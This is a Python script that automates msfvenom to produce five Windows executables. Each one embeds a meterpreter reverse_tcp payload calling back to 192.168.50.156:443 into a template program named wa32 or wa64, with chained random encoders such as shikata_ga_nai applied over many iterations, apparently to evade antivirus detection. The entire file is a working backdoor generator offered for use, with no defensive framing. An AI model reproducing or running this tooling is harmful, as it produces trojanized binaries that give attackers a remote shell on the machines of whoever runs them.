#!/usr/bin/env python3
"""
q.py
Artur Matias
2021-06-28

mfsvenom generator
"""

import os
import random

def banner():
    print("#------------------------------------------------------------------------------#") 
    print("|        Artur Matias                                        2021-08-01        |")
    print("#------------------------------------------------------------------------------#")

def create_folder():
    os.system("mkdir -p \"" + executable + "\"")

def generate_venom(n_file, n_raws):
    #venom = ''
    try:
        if n_raws == 1:
            venom = venom_single(n_file)

        elif n_raws == 2:
            venom = venom_start() + venom_end(n_file)

        elif n_raws >= 3:
            venom = venom_start()
            for _ in range(n_raws):
                venom += raw()
            venom += venom_end(n_file)

        print("\nExecuting:\n" + venom + "\n")
        os.system(venom)

    except Exception as e:
        print("Failed:", e)


    

def run():
    create_folder()

    for n_file in range(n_files):
        n_file += 1
        generate_venom(n_file, r_raws())


def venom_single(n_file):
    venom_single = "msfvenom -a " + arch + " --platform " + platform + " -p " + payload + " lhost=" + lhost + " lport=" + lport + " -e " + r_encoder() + " -i " + r_iterations() + " -x ./" + executable + ".exe -f " + f + " -o ./" + executable + "/" + executable + "-" + str(n_file) + ".exe"
    return venom_single


def venom_start():
    venom_start = "msfvenom -a " + arch + " --platform " + platform + " -p " + payload + " lhost=" + lhost + " lport=" + lport + " -e " + r_encoder() + " -i " + r_iterations() + " -f raw"
    return venom_start


def raw():
    raw = " | msfvenom -a " + arch + " --platform " + platform + " -e " + r_encoder() + " -i " + r_iterations() + " -f raw"
    return raw


def venom_end(n_file):
    venom_end = " | msfvenom -a " + arch + " --platform " + platform + " -e " + r_encoder() + " -i " + r_iterations() + " -x ./" + executable + ".exe -f " + f + " -o ./" + executable + "/" + executable + "-" + str(n_file) + ".exe"
    return venom_end


def r_encoder():
    r = random.choice(encoders)
    return r


def r_iterations():
    r = str(random.randint(1, max_r_iterations))
    return r


def r_raws():
    r = random.randint(1, max_r_raw)
    return r


def get_arch():
    print("What architecture is the executable?")
    print("1 - x86")
    print("2 - x64\n")
    answer = input('> ')
    
    if answer == '1':
        arch = 'x86'
    elif answer == '2':
        arch = 'x64'
    else:
        print("Invalid option, defaulting to x86")
        arch = 'x86'

    return arch


def get_platform():
    platform = 'windows'
    
    return platform


def get_payload():
    if arch == "x86":
        payload = 'windows/meterpreter/reverse_tcp'
    elif arch == "x64":
        payload = 'windows/x64/meterpreter/reverse_tcp'
    
    return payload


def get_lhost():
    lhost = '192.168.50.156'
    
    return lhost


def get_lport():
    lport = '443'
    
    return lport


def get_executable():
    if arch == "x86":
        executable = 'wa32'
    elif arch == "x64":
        executable =  'wa64'
    
    return executable


def get_encoders():
    if arch == "x86":
        # All x86 encoders
        #encoders = ["add_sub", "alpha_mixed", "unicode_mixed", "unicode_upper", "alpha_upper", "avoid_utf8_tolower", "avoid_underscore_tolower", "bmp_polyglot", "bloxor", "context_cpuid", "call4_dword_xor", "xor_dynamic", "jmp_call_additive", "nonalpha", "nonupper", "shikata_ga_nai", "service", "single_static_bit", "countdown", "opt_sub", "fnstenv_mov", "context_stat", "context_time"]
        
        # No low or manual rank
        encoders = ["x86/shikata_ga_nai", "x86/countdown", "x86/fnstenv_mov"]
    elif arch == "x64":
        encoders = ["x64/xor", "x64/xor_context", "x64/xor_dynamic", "x64/zutto_dekiru"]
    
    return encoders


def get_format():
    if arch == "x86":
        f = 'exe'
        print(f, arch)
    elif arch == "x64":
        f = 'exe-only'
        print(f, arch)
    
    return f

if __name__ == "__main__":

    banner()

    #arch = 'x64'
    #platform = 'windows'
    #payload = 'windows/x64/meterpreter/reverse_tcp'
    #lhost = '192.168.50.156'
    #lport = '443'
    #executable = 'wa64'
    #format = 'exe-only'
    #encoders = ["xor", "xor_context", "xor_dynamic", "zutto_dekiru"]

    arch = get_arch()
    platform = get_platform()
    payload = get_payload()
    lhost = get_lhost()
    lport = get_lport()
    executable = get_executable()
    encoders = get_encoders()
    f = get_format()

    # Max random raw sequences
    max_r_raw = 5

    # Max random iterations per raw
    max_r_iterations = 200

    # How many executables will be generated
    n_files = 5


    run()
